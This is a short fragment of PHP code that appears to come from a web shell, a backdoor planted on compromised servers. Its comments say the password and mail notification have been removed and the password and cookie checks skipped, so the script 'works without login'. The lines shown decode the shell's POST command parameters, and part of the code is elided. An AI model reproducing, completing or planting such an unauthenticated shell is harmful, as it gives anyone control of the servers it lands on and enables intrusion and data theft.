<?php
// Password and mail removed – script now works without login
...
// Decrypt POST values if needed, but skip password/cookie checks
if (!isset($_POST['ne'])) {
    if (isset($_POST['a']))  $_POST['a']  = iconv("utf-8", $_POST['charset'], $_POST['a']);
    if (isset($_POST['c']))  $_POST['c']  = iconv("utf-8", $_POST['charset'], $_POST['c']);
    if (isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], $_POST['p1']);
    if (isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], $_POST['p2']);
    if (isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], $_POST['p3']);
}
